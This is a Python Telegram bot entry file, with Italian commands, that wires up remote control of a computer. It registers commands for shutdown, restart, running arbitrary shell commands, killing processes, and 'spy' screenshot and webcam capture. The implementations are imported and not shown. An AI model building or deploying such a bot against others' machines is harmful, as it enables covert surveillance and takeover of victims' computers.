#Telegram Modules
from telegram.ext.updater import Updater
from telegram.update import Update
from telegram.ext.callbackcontext import CallbackContext
from telegram.ext.commandhandler import CommandHandler

#Bot Modules
from internet import *
from spy import *
from utility import *
from tokenReader import BOT_TOKEN


updater = Updater(BOT_TOKEN, use_context=True)

def start(update: Update, context: CallbackContext):
    update.message.reply_text("Salve Boss, cosa vuole che faccia")


updater.dispatcher.add_handler(CommandHandler('start', start))

#Utility
updater.dispatcher.add_handler(CommandHandler('spegni', spegni))
updater.dispatcher.add_handler(CommandHandler('riavvia', riavvia))
updater.dispatcher.add_handler(CommandHandler('cmd', cmd))
updater.dispatcher.add_handler(CommandHandler('kill', kill))

#Spy
updater.dispatcher.add_handler(CommandHandler('screenshot', screenshot))
updater.dispatcher.add_handler(CommandHandler('camera', camera))

#Internet
updater.dispatcher.add_handler(CommandHandler('chrome', chrome))
updater.dispatcher.add_handler(CommandHandler('url', url))
updater.dispatcher.add_handler(CommandHandler('cerca', cerca))


updater.start_polling()